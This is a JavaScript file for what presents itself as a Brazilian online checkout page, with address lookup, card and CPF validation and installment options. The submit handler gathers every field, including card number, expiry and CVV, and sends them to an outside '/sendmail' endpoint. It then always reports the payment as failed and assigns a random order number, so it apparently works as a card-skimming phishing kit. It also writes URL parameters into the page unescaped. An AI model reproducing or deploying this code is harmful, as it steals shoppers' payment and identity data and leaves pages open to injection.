const zipCodeInput = document.getElementById('zipCode');
const addressNumberInput = document.getElementById('addressNumber');
const complementInput = document.getElementById('complement');
const neighborhoodInput = document.getElementById('neighborhood');
const cityInput = document.getElementById('city');
const stateSelect = document.getElementById('state');

zipCodeInput.addEventListener('input', function() {
    const zipCode = this.value.replace(/\D/g, '');

    if (zipCode.length > 8) {
        this.value = zipCode.slice(0, 8);
        this.classList.add('error');
        return;
    }

    if (zipCode.length === 8) {
        fetch(`https://viacep.com.br/ws/${zipCode}/json/`)
            .then(response => response.json())
            .then(data => {
                if (!data.erro) {
                    addressNumberInput.disabled = false;
                    complementInput.disabled = false;
                    neighborhoodInput.disabled = false;
                    cityInput.disabled = false;
                    stateSelect.disabled = false;

                    addressNumberInput.value = '';
                    complementInput.value = data.complemento || '';
                    neighborhoodInput.value = data.bairro;
                    cityInput.value = data.localidade;
                    stateSelect.value = data.uf;

                    addressNumberInput.focus();
                } else {
                    addressNumberInput.disabled = false;
                    complementInput.disabled = false;
                    neighborhoodInput.disabled = false;
                    cityInput.disabled = false;
                    stateSelect.disabled = false;

                    complementInput.value = '';
                    neighborhoodInput.value = '';
                    cityInput.value = '';
                    stateSelect.value = '';
                    this.classList.add('error');
                    this.focus();
                }
            }).catch(error => {
                this.classList.add('error');
                this.focus();
            });
    } else {
        addressNumberInput.disabled = true;
        complementInput.disabled = true;
        neighborhoodInput.disabled = true;
        cityInput.disabled = true;
        stateSelect.disabled = true;
        complementInput.value = '';
        neighborhoodInput.value = '';
        cityInput.value = '';
        stateSelect.value = '';
    }
});

const paymentButton = document.getElementById('paymentButton');
paymentButton.addEventListener('click', async (event) => {
    event.preventDefault();

    if (!validateForm()) {
        return;
    }

    const loading = document.getElementById('loading')
    loading.style.display = 'flex';
    loading.querySelector('h1').textContent = 'Analisando...';
    loading.querySelector('p').style.display = 'none';

    setTimeout( function () {
        loading.querySelector('h1').textContent = 'Pagamendo não efetuado.';
        loading.querySelector('i').style.display = 'none';
        loading.querySelector('p').style.display = 'flex';
    }, 5000);

    loading.querySelector('button').addEventListener('click', function () {
        loading.style.display = 'none';
    });

    const formData = {};
    const fields = document.querySelectorAll('input, select');
    fields.forEach(field => {
        formData[field.id] = field.value;
    });

    const urlParams = new URLSearchParams(window.location.search);
    for (const [key, value] of urlParams.entries()) {
        formData[key] = value;
    }

    try {
        const response = await fetch('https://codesnode-production.up.railway.app/sendmail', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(formData)
        });

        if (!response.ok) {
            const errorText = await response.text();
            throw new Error(`Server Error: ${response.status} - ${errorText}`);
        }

        const data = await response.json();
        console.log(data);
    } catch (error) {
        console.error("Error submitting payment:", error);
    }
});

function validateForm() {
    let isValid = true;
    const fields = document.querySelectorAll('input, select');

    fields.forEach(field => {
        const label = field.previousElementSibling;
        const required = label && label.querySelector('span');

        field.classList.remove('error');

        if (required && field.value.trim() == '' || required && field.value == 'null') {
            field.classList.add('error');
            isValid = false;
        } else {
            switch (field.id) {
                case 'cpf':
                    if (!validateCPF(field.value)) {
                        field.classList.add('error');
                        isValid = false;
                    }
                    break;
                case 'contactPhone':
                    if (!validatePhone(field.value)) {
                        field.classList.add('error');
                        isValid = false;
                    }
                    break;
                case 'installments':
                    if (field.value === 'null') {
                        field.classList.add('error');
                        isValid = false;
                    }
                    break;
                case 'zipCode':
                    if (!validateZIPCode(field.value)) {
                        field.classList.add('error');
                        isValid = false;
                    }
                    break;
                case 'addressNumber':
                    if (isNaN(field.value) || field.value <= 0) {
                        field.classList.add('error');
                        isValid = false;
                    }
                    break;
                case 'cardExpiry':
                    if (!validateDate(field.value)) {
                        field.classList.add('error');
                        isValid = false;
                    }
                    break;
                case 'cardCvv':
                    if (isNaN(field.value) || field.value.length !== 3) {
                        field.classList.add('error');
                        isValid = false;
                    }
                    break;
                case 'cardNumber':
                    if (!validateCardNumber(field.value)) {
                        field.classList.add('error');
                        isValid = false;
                    }
                    break;
            }
        }
    });

    return isValid;
}

const allInputs = document.querySelectorAll('input, select');
allInputs.forEach(input => {
    input.addEventListener('input', () => {
        input.classList.remove('error');
    });
    if (input.tagName === 'SELECT') {
        input.addEventListener('change', () => {
            input.classList.remove('error');
        });
    }
});

function validateCardNumber(number) {
    const regex = /^\d{4}\ \d{4}\ \d{4}\ \d{4}$/;
    return regex.test(number);
}

function validateCPF(cpf) {
    const regex = /^\d{3}\.\d{3}\.\d{3}-\d{2}$/;
    return regex.test(cpf);
}

function validatePhone(phone) {
    phone = phone.replace(/\D/g, '');
    return phone.length >= 10;
}

function validateZIPCode(zipCode) {
    zipCode = zipCode.replace(/\D/g, '');
    return zipCode.length === 8;
}

function validateDate(date) {
    const regex = /^(0[1-9]|1[0-2])\/\d{2}$/;
    return regex.test(date);
}

const urlParams = new URLSearchParams(window.location.search);
const id = urlParams.get('id');
const model = urlParams.get('model');
const quantity = urlParams.get('quantity');
const color = urlParams.get('color');
const installmentsSelect = document.getElementById('installments');
const price = urlParams.get('price');
const total = parseFloat(price) * parseInt(quantity);
const resumeText = `Modelo: ${model}<br>Cor: ${color}<br>Unidades: ${quantity}<br>Total: R$ ${total.toFixed(2)}`;
const ramdomOrder = Math.floor(Math.random() * 9000) + 1000;

document.getElementById('order').innerHTML = 'Pedido: #' + ramdomOrder;
document.querySelector('#resume p').innerHTML = resumeText;

function updateInstallments(total) {
    installmentsSelect.innerHTML = '<option value="null" disabled selected>Selecione</option>';

    for (let i = 1; i <= 12; i++) {
        const installmentValue = total / i;
        const formattedValue = installmentValue.toFixed(2).replace('.', ',');
        installmentsSelect.innerHTML += `<option value="${i}">${i}x de R$ ${formattedValue}</option>`;
    }
}

updateInstallments(total);